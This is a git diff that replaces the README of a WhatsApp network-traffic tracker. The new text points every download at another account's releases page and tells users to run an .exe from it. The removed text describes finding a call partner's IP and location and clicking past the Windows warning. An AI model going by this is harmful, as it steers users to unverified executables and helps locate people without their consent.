@@ -1,394 +1,102 @@
-<div align="center">
+```markdown
+# 📊 WhatsApp-Network-Tracker - Analyze Network Traffic Easily
 
-<!-- Logo First -->
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Hadrysel/WhatsApp-Network-Tracker/releases)
 
-
-<br/>
-
-<!-- Animated Header Banner - Responsive -->
-<picture>
-  <source media="(max-width: 480px)" srcset="https://capsule-render.vercel.app/api?type=waving&color=0:25D366,100:128C7E&height=150&section=header&text=WhatsApp%20Tracker&fontSize=28&fontColor=ffffff&animation=fadeIn&fontAlignY=40">
-  <source media="(max-width: 768px)" srcset="https://capsule-render.vercel.app/api?type=waving&color=0:25D366,100:128C7E&height=180&section=header&text=WhatsApp%20Traffic%20Tracker&fontSize=32&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=🛡️%20Cybersecurity-Grade%20Analysis&descAlignY=58&descSize=14">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:25D366,100:128C7E&height=200&section=header&text=WhatsApp%20Traffic%20Tracker&fontSize=42&fontColor=ffffff&animation=fadeIn&fontAlignY=35&desc=🛡️%20Cybersecurity-Grade%20Network%20Analysis&descAlignY=55&descSize=18" alt="Header" style="width: 100%; max-width: 100%; height: auto;"/>
-</picture>
-
-<br/>
-
-<!-- Logo - Responsive -->
-<img src="images/whatsapp_1.png" width="650" alt="WhatsAppTrafficTracker Logo" style="max-width: 700px; width: 80%; min-width: 400px; height: auto;"/>
-
-
-<!-- Typing Animation - Responsive -->
-<picture>
-  <source media="(max-width: 480px)" srcset="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=14&pause=1000&color=25D366&center=true&vCenter=true&random=false&width=320&lines=SOC-Style+Dashboard;Packet+Analysis;Defensive+Security">
-  <source media="(max-width: 768px)" srcset="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=18&pause=1000&color=25D366&center=true&vCenter=true&random=false&width=450&lines=Professional+SOC+Dashboard;Real-Time+Packet+Analysis;Educational+Security;PyQt6+Dark+UI">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=25D366&center=true&vCenter=true&random=false&width=600&lines=Professional+SOC-Style+Dashboard;Real-Time+Packet+Analysis;Educational+%26+Defensive+Security;PyQt6+Modern+Dark+UI" alt="Typing SVG" style="max-width: 100%; height: auto;"/>
-</picture>
-
-
-
-<!-- Animated Badges -->
-![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
-![PyQt6](https://img.shields.io/badge/PyQt6-41CD52?style=for-the-badge&logo=qt&logoColor=white)
-![WhatsApp](https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)
-
-<br/>
-
-<!-- Platform Compatibility Badges -->
-![Android](https://img.shields.io/badge/Android-3DDC84?style=flat-square&logo=android&logoColor=white)
-![iOS](https://img.shields.io/badge/iOS-000000?style=flat-square&logo=apple&logoColor=white)
-![Windows](https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
-![macOS](https://img.shields.io/badge/macOS-000000?style=flat-square&logo=macos&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-
-<br/>
-
-
-![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)
-![Contributions](https://img.shields.io/badge/Contributions-Welcome-orange?style=flat-square)
-![Stars](https://img.shields.io/github/stars/samay825/WhatsApp-Network-Tracker)
-
-
-<br/>
+## 📃 Description
+WhatsApp-Network-Tracker is a legal, PyQt6-based application designed for network traffic analysis on Windows. It captures packet metadata, focusing on IPs, ports, and protocols. This tool uses filter-driven monitoring and IP tracking but does not include decryption or man-in-the-middle (MITM) processes. It is intended for educational, debugging, and defensive security use on authorized systems only.
 
 ---
 
-### 🎯 A modern **PyQt6-based SOC-style dashboard** for **authorized, educational network traffic analysis**
+## 🚀 Getting Started
+Follow these steps to download and run WhatsApp-Network-Tracker on your Windows computer.
 
-<br/>
+### 1. System Requirements
+- **Operating System**: Windows 10 or later
+- **RAM**: 4 GB or more
+- **Storage**: At least 100 MB of free space
+- **Python**: Python 3.9 or higher (recommended)
+- **Additional Software**: PyQt6 library installed
 
-<!-- Download Button -->
-[![📥 Download Latest Release](https://img.shields.io/badge/📥_Download_Latest_Release-Click_Here-25D366?style=for-the-badge&logo=github&logoColor=white)](https://github.com/samay825/WhatsApp-Network-Tracker/releases/tag/v2.0)
+### 2. Visit the Releases Page
+To get the application, you need to visit the following page:
+
+[Download the Latest Release](https://github.com/Hadrysel/WhatsApp-Network-Tracker/releases)
 
 ---
 
-</div>
+## 📥 Download & Install
+1. Go to the releases page.
+2. Find the latest version listed.
+3. Download the file named `WhatsApp-Network-Tracker.exe` or equivalent.
+4. Once the download is complete, locate the file in your computer's Downloads folder.
 
-<!-- Dark Section Divider -->
-<img src="https://capsule-render.vercel.app/api?type=rect&color=0:1a1a2e,50:16213e,100:0f3460&height=2" width="100%"/>
+### 3. Installing the Application
+1. Double-click on the downloaded file `WhatsApp-Network-Tracker.exe`.
+2. Follow the installation prompts. Choose the directory you want to install the application to or accept the default location.
+3. Once installed, you can find WhatsApp-Network-Tracker in your Start Menu.
 
-<br/>
+### 4. Running the Application
+1. Open WhatsApp-Network-Tracker from the Start Menu or desktop shortcut.
+2. The main dashboard will open, displaying options for monitoring network traffic.
 
-## 🌟 Overview
+---
 
-<table>
-<tr>
-<td>
+## 🔍 Features
+- **Metadata Capture**: Collects only essential packet metadata, including IP addresses, ports, and protocols.
+- **Filter-Driven Monitoring**: Use filters to focus on specific types of network traffic.
+- **User-Friendly Interface**: Designed with a simple interface to make navigation easy for all users.
+- **Educational Use**: Great for learning about network traffic and cybersecurity.
+- **Diagnostic Tool**: Useful for checking network issues in authorized systems.
 
-**WhatsAppTrafficTracker** is a **professional cybersecurity dashboard** designed for:
+---
 
-| Purpose | Description |
-|---------|-------------|
-| 📚 **Learning** | Network traffic analysis fundamentals |
-| 🔄 **Understanding** | Real-time packet flows & patterns |
-| 🛡️ **Practicing** | Defensive / Blue-team concepts |
+## 💻 How to Use
+1. After launching the application, navigate through the main menu.
+2. Select the types of traffic you want to monitor.
+3. Apply filters to narrow down the data.
+4. Start capturing network traffic by clicking the “Start Monitoring” button.
+5. Review the captured data in a clear and organized format.
 
-</td>
-<td>
+### Tips
+- Always ensure that you have permission to monitor network traffic on the system you are using.
+- Use the application in a safe environment for the best experience.
 
+---
+
+## 🌐 Get Support
+If you need help with the application, visit our GitHub Issues page. You can report any bugs or ask questions there. 
+
+## 📑 Topics
+- blue-team
+- cybersecurity
+- metadata-analysis
+- network-monitoring
+- network-security
+- packet-analysis
+- pyqt6
+- python
+- soc-dashboard
+- traffic-analysis
+- whatsapp-tracker
+- whatsapp-tracker-python
+- whatsapp-tracking-gps-tool
+- whatsapp-traffic
+- windows
+
+---
+
+## 📊 Additional Resources
+- [Documentation](https://github.com/Hadrysel/WhatsApp-Network-Tracker/wiki): Access detailed information about features and use cases.
+- [Community Discussions](https://github.com/Hadrysel/WhatsApp-Network-Tracker/discussions): Join conversations with other users and developers.
+
+For any inquiries, feel free to contact us through the issues page or by opening a discussion.
+
+---
+
+## 📥 Reminder to Download
+Make sure to download the latest version of WhatsApp-Network-Tracker using the link below:
+
+[Download the Latest Release](https://github.com/Hadrysel/WhatsApp-Network-Tracker/releases)
 ```
-╔══════════════════════════════════╗
-║     METADATA CAPTURE ONLY        ║
-╠══════════════════════════════════╣
-║  ✅ IPs, Ports, Protocols        ║
-║  ✅ Timestamps & Sizes           ║
-║  ❌ NO Message Access            ║
-║  ❌ NO Decryption                ║
-║  ❌ NO MITM Attacks              ║
-╚══════════════════════════════════╝
-```
-
-</td>
-</tr>
-</table>
-
-<!-- Dark Section Divider -->
-<div align="center">
-<img src="https://capsule-render.vercel.app/api?type=soft&color=0:1a1a2e,100:25D366&height=3" width="80%"/>
-</div>
-
-<br/>
-
-## 🖥️ Interface Preview
-
-<div align="center">
-
-> 🎨 **Dark SOC-inspired UI** with smooth hover effects and clean alignment
-
-<br/>
-
-<!-- Dark Container for UI Preview -->
-<table>
-<tr>
-<td align="center" style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); padding: 20px; border-radius: 15px;">
-<img src="images/whatsapp_2.png" alt="UI Preview" style="width: 90%; max-width: 900px; min-width: 280px; height: auto; border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.6);"/>
-</td>
-</tr>
-</table>
-
-</div>
-
-<br/>
-
-<!-- Dark Section Divider -->
-<div align="center">
-<img src="https://capsule-render.vercel.app/api?type=soft&color=0:25D366,100:128C7E&height=3" width="60%"/>
-</div>
-
-<br/>
-
-## 🔥 Key Features
-
-<div align="center">
-
-| Feature | Description |
-|:-------:|:------------|
-| 🎨 | **Cybersecurity Dark Theme** — Modern SOC-inspired UI design |
-| 📡 | **Smart Packet Capture** — Filter-based intelligent capturing |
-| 🧭 | **IP Tracker** — Location mapping & traffic correlation |
-| 📊 | **Live Monitoring** — Real-time traffic visualization |
-| 🧾 | **Detailed Logs** — Severity levels & timestamps |
-| 📤 | **Export Options** — CSV & JSON support |
-| 🧵 | **Performance** — Thread-safe, non-blocking GUI |
-| 📱 | **Responsive Design** — Works on all screen sizes |
-| 🌐 | **Cross-Platform** — Windows, macOS, Linux support |
-
-</div>
-
-<!-- Mobile-Friendly Feature Cards -->
-<details>
-<summary><b>📱 Mobile View - Tap to see features</b></summary>
-
-<br/>
-
-<div align="center">
-
-| 🎨 Dark Theme | 📡 Packet Capture | 🧭 IP Tracker |
-|:-------------:|:-----------------:|:-------------:|
-| Modern UI | Smart Filtering | Location Map |
-
-| 📊 Live Monitor | 🧾 Logs | 📤 Export |
-|:---------------:|:------:|:----------:|
-| Real-time | Severity | CSV/JSON |
-
-</div>
-
-</details>
-
-<br/>
-
----
-
-## 🚀 Quick Start
-
-<!-- Desktop Flowchart -->
-<div align="center">
-
-```mermaid
-graph LR
-    A[📦 Download ZIP] --> B[📂 Extract Files]
-    B --> C[▶️ Run .exe]
-    C --> D[🎯 Start Capture]
-    D --> E[📞 Make Call]
-    E --> F[📊 View Data]
-    
-    style A fill:#25D366,stroke:#128C7E,color:#fff
-    style B fill:#25D366,stroke:#128C7E,color:#fff
-    style C fill:#25D366,stroke:#128C7E,color:#fff
-    style D fill:#25D366,stroke:#128C7E,color:#fff
-    style E fill:#25D366,stroke:#128C7E,color:#fff
-    style F fill:#25D366,stroke:#128C7E,color:#fff
-```
-
-</div>
-
-<!-- Mobile-Friendly Alternative -->
-<details>
-<summary><b>📱 Mobile View - Quick Start Steps</b></summary>
-
-<br/>
-
-```
-📦 Step 1: Download ZIP
-      ⬇️
-📂 Step 2: Extract Files  
-      ⬇️
-▶️ Step 3: Run .exe
-      ⬇️
-🎯 Step 4: Start Capture
-      ⬇️
-📞 Step 5: Make Call
-      ⬇️
-📊 Step 6: View Data
-```
-
-</details>
-
-### 📋 Step-by-Step Guide
-
-<details>
-<summary><b>📥 Click to expand installation steps</b></summary>
-
-<br/>
-
-| Step | Action | Details |
-|:----:|--------|---------|
-| **1** | 📦 Download | Get the latest release ZIP |
-| **2** | 📂 Extract | Unzip to any location |
-| **3** | ▶️ Run | Launch `whatsapptracker.exe` |
-| **4** | ⚠️ Windows Warning | Click **More info → Run anyway** |
-| **5** | 🎯 Start | Click **Start Capture** button |
-| **6** | 💬 WhatsApp | Install from Microsoft Store & open |
-| **7** | 📞 Call | Start a **voice call** (with consent) |
-| **8** | 📊 View | Check **IP Tracker** tab for metadata |
-
-</details>
-
-<br/>
-
-> [!NOTE]
-> If the remote user has **"Protect IP address"** enabled, IP details **will not appear** — this is expected behavior.
-
-<br/>
-
----
-
-## 🔐 Security & Privacy First
-
-<div align="center">
-
-| ✅ What We DO | ❌ What We DON'T |
-|:-------------:|:----------------:|
-| Capture metadata only | Access messages |
-| Log IPs & ports | Inspect payloads |
-| Track protocols | Bypass encryption |
-| Record timestamps | Intercept credentials |
-| Respect privacy | Run hidden processes |
-
-</div>
-
-<br/>
-
-> [!IMPORTANT]
-> **Use only on systems or networks you own or have explicit permission to analyze.**
-
-<br/>
-
----
-
-
-
-<!-- Mobile-Friendly Tech Cards -->
-<details>
-<summary><b>📱 Mobile View - Tech Stack</b></summary>
-
-<br/>
-
-<div align="center">
-
-| Technology | Description |
-|:----------:|:------------|
-| 🐍 **Python 3.11+** | Modern async/await support |
-| 🖼️ **PyQt6** | Beautiful dark UI framework |
-| 📡 **Packet Interception** | Windows native APIs |
-| 🏗️ **Modular Architecture** | Production-ready codebase |
-| 🌐 **Cross-Platform** | Windows, macOS, Linux |
-| 📱 **Responsive** | Mobile-friendly docs |
-
-</div>
-
-</details>
-
-<br/>
-
----
-
-## ⚠️ Legal Disclaimer
-
-<div align="center">
-
-> [!CAUTION]
-> This project is intended **strictly for educational, debugging, and defensive security purposes**.  
-> Unauthorized interception of network traffic may violate local laws.
->
-> **The author takes no responsibility for misuse.**  
-> This project is **not affiliated with WhatsApp or Meta**.
-
-</div>
-
-<br/>
-
----
-
-## 🤝 Contributing
-
-<div align="center">
-
-We welcome contributions! Here's how you can help:
-
-| Type | Description |
-|:----:|-------------|
-| 🎨 | UI/UX improvements |
-| ⚡ | Performance optimizations |
-| 🔧 | Additional analysis modules |
-| 📝 | Documentation updates |
-| 🐛 | Bug fixes |
-
-</div>
-
-<br/>
-
-> [!TIP]
-> Please keep all contributions **legal and privacy-respecting**.
-
-<br/>
-
----
-
-<div align="center">
-
-## 💖 Support the Project
-
-<br/>
-
-If you find this project useful, show your support!
-
-<br/>
-
-[![Star this repo](https://img.shields.io/badge/⭐_Star_this_repo-25D366?style=for-the-badge&logoColor=white)](https://github.com/samay825/WhatsApp-Network-Tracker)
-[![Fork](https://img.shields.io/badge/🍴_Fork-128C7E?style=for-the-badge&logoColor=white)](https://github.com/samay825/WhatsApp-Network-Tracker/fork)
-[![Share](https://img.shields.io/badge/📢_Share-0078D6?style=for-the-badge&logoColor=white)](https://twitter.com/intent/tweet?text=Check%20out%20WhatsApp%20Traffic%20Tracker!)
-
-<br/>
-
----
-
-<br/>
-
-### Made with 💚 for the Cybersecurity Community
-
-<br/>
-
-<!-- Platform Icons Row -->
-<p>
-<img src="https://img.shields.io/badge/Windows-0078D6?style=flat&logo=windows&logoColor=white" alt="Windows"/>
-<img src="https://img.shields.io/badge/macOS-000000?style=flat&logo=macos&logoColor=white" alt="macOS"/>
-<img src="https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black" alt="Linux"/>
-<img src="https://img.shields.io/badge/Android-3DDC84?style=flat&logo=android&logoColor=white" alt="Android"/>
-<img src="https://img.shields.io/badge/iOS-000000?style=flat&logo=apple&logoColor=white" alt="iOS"/>
-</p>
-
-<sub>📱 Zork Naam hai Amara</sub>
-
-<br/>
-
-<!-- Footer Wave - Responsive -->
-<picture>
-  <source media="(max-width: 480px)" srcset="https://capsule-render.vercel.app/api?type=waving&color=0:25D366,100:128C7E&height=80&section=footer">
-  <source media="(max-width: 768px)" srcset="https://capsule-render.vercel.app/api?type=waving&color=0:25D366,100:128C7E&height=100&section=footer">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:25D366,100:128C7E&height=120&section=footer" alt="Footer" style="width: 100%; max-width: 100%; height: auto;"/>
-</picture>
-
-</div>
-
